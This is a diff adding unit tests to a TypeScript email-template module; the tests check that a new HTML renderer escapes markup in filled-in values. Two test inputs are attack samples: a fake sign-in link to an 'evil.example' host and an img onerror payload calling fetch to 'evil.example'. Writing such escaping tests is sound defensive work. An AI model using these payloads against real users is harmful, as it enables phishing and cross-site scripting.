@@ -1,4 +1,4 @@
-import { EMAIL_TEMPLATE_SEEDS, EmailService, renderTemplate } from './email.service';
+import { EMAIL_TEMPLATE_SEEDS, EmailService, renderHtmlTemplate, renderTemplate } from './email.service';
 
 describe('renderTemplate', () => {
   it('fills {{variables}} and blanks unknown ones', () => {
@@ -9,6 +9,44 @@ describe('renderTemplate', () => {
 
   it('tolerates whitespace inside the braces', () => {
     expect(renderTemplate('{{  companyName  }}', { companyName: 'Acme' })).toBe('Acme');
+  });
+
+  it('leaves values raw: it is for subject and plain-text bodies only', () => {
+    expect(renderTemplate('{{companyName}}', { companyName: 'Apex & Sons' })).toBe('Apex & Sons');
+  });
+});
+
+describe('renderHtmlTemplate (SB-H3)', () => {
+  it('escapes markup in values so emails cannot carry HTML', () => {
+    const attack =
+      '<a href="https://servicebridge-sso.evil.example">Session expired - sign in again</a>';
+    const html = renderHtmlTemplate('<p>Ticket <strong>{{ticketNumber}}</strong> — {{ticketTitle}}</p>', {
+      ticketNumber: 'SB-26-000101',
+      ticketTitle: attack,
+    });
+    expect(html).not.toContain('<a href=');
+    expect(html).toContain('&lt;a href=&quot;https://servicebridge-sso.evil.example&quot;&gt;');
+  });
+
+  it('escapes all five HTML-significant characters', () => {
+    expect(renderHtmlTemplate('{{v}}', { v: `&<>"'` })).toBe('&amp;&lt;&gt;&quot;&#39;');
+  });
+
+  it('blanks unknown variables and renders numbers', () => {
+    expect(renderHtmlTemplate('{{missing}}|{{daysLeft}}', { daysLeft: 30 })).toBe('|30');
+  });
+
+  it('neutralises the ERP customer-name vector in the CSAT invite template', () => {
+    const seed = EMAIL_TEMPLATE_SEEDS.find((t) => t.key === 'csat.invite');
+    expect(seed).toBeDefined();
+    const html = renderHtmlTemplate(seed!.bodyHtml, {
+      customerName: '<img src=x onerror="fetch(\'https://evil.example/c\')">',
+      ticketNumber: 'SB-26-000101',
+      feedbackUrl: 'https://app.example/feedback/abc',
+      companyName: 'Acme',
+    });
+    expect(html).not.toContain('<img');
+    expect(html).toContain('&lt;img src=x onerror=');
   });
 });
 
